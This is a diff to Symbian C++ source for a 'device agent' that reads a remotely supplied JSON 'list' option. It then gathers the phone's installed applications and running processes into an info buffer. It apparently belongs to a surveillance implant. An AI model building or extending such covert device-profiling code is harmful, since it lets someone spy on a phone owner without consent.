@@ -28,9 +28,11 @@
 #include <apgcli.h>
 #include <e32std.h>
 
+#include "Json.h"
+
 
 CAgentDevice::CAgentDevice() :
-	CAbstractAgent(EAgent_Device),iBusy(EFalse)
+	CAbstractAgent(EAgent_Device),iBusy(EFalse),iList(EFalse)
 	{
 	// No implementation required
 	}
@@ -61,8 +63,40 @@ CAgentDevice* CAgentDevice::NewL(const TDesC8& params)
 void CAgentDevice::ConstructL(const TDesC8& params)
 	{
 	BaseConstructL(params);
+	
 	__FLOG_OPEN("HT", "Agent_Device.txt");
 	__FLOG(_L("-------------"));
+	
+	//retrieve parameters
+	RBuf paramsBuf;
+						
+	TInt errCreate = paramsBuf.Create(2*params.Size());
+	if(errCreate == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+					
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//get list
+		if(rootObject->Find(_L("list")) != KErrNotFound)
+			rootObject->GetBoolL(_L("list"),iList);
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+		
 	iPhone = CPhone::NewL();  
 	}
 
@@ -260,22 +294,25 @@ HBufC8* CAgentDevice::GetInfoBufferL()
 	buffer->InsertL(buffer->Size(),buf.Ptr(),buf.Size());
 	
 	//list
-	RApaLsSession lsSession;
-	TApaAppInfo appInfo;
-	TApaAppCapabilityBuf capability;
-	// Applications list:
-	if( lsSession.Connect() == KErrNone)
+	if(iList)
 		{
-		CleanupClosePushL( lsSession );
-		lsSession.GetAllApps();
-		_LIT(KAppList,"\nApplication List: \n");
-		buffer->InsertL(buffer->Size(),KAppList().Ptr(),KAppList().Size());
-		while( lsSession.GetNextApp( appInfo ) == KErrNone )
+		RApaLsSession lsSession;
+		TApaAppInfo appInfo;
+		TApaAppCapabilityBuf capability;
+		// Applications list:
+		if( lsSession.Connect() == KErrNone)
 			{
-			buffer->InsertL(buffer->Size(), appInfo.iCaption.Ptr(), appInfo.iCaption.Size());
-			buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
+			CleanupClosePushL( lsSession );
+			lsSession.GetAllApps();
+			_LIT(KAppList,"\nApplication List: \n");
+			buffer->InsertL(buffer->Size(),KAppList().Ptr(),KAppList().Size());
+			while( lsSession.GetNextApp( appInfo ) == KErrNone )
+				{
+				buffer->InsertL(buffer->Size(), appInfo.iCaption.Ptr(), appInfo.iCaption.Size());
+				buffer->InsertL(buffer->Size(),KNewLine().Ptr(),KNewLine().Size());
+				}
+			CleanupStack::PopAndDestroy(&lsSession);
 			}
-		CleanupStack::PopAndDestroy(&lsSession);
 		}
 	// Running processes
 	TFullName res;
